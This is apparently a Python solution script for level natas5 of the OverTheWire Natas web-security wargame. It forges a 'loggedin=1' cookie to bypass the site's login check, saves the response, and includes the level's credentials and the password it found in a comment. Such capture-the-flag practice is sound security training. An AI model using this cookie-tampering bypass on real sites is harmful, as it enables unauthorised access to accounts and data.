import requests
import sys
username = "natas5"
password = "iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq"

#header = {"referer": "http://natas5.natas.labs.overthewire.org/"}
cookie = {"loggedin": "1"}
response = requests.get("http://natas5.natas.labs.overthewire.org", auth=(username, password), cookies=cookie)

sys.stdout = open("results.html", "w")
print(response.text)
print(response.cookies)
sys.stdout.close()

#found pass is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1